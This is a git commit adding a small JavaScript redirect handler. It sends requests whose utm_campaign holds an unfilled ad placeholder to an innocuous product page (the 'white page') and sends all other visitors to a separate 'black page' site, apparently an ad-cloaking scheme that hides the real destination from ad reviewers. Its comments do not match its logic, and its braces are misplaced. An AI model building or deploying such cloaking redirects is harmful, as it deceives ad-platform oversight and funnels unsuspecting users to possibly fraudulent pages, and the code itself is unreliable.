59c8e90b6aaf0ca13f9eda88903265ee6e43ae29
Ayden Xu <aydenxunc@gmail.com>
2025-01-05 13:03:20 -0500

    inittt

---
+++ api/redirect.js
@@ -0,0 +1,19 @@
+export default function handler(req, res) {
+    // URLs to redirect
+    const whitePageURL = "https://www.gagebeasleyshop.com/products/stegosaurus-rbg";
+    const blackPageURL = "https://rwrds.live";
+  
+    // Parse the UTM parameters from the request URL
+    const queryParams = new URLSearchParams(req.url.split('?')[1]);
+    const utmCampaign = queryParams.get('utm_campaign');
+  
+   // Redirection logic
+   if (utmCampaign === '__AID_NAME__') {
+    // UTM campaign 'l1' takes priority for both desktop and mobile
+    res.writeHead(302, { Location: whitePageURL });
+  } else{
+    // Mobile devices without 'l1' campaign
+    res.writeHead(302, { Location: blackPageURL });
+
+  res.end();
+}}
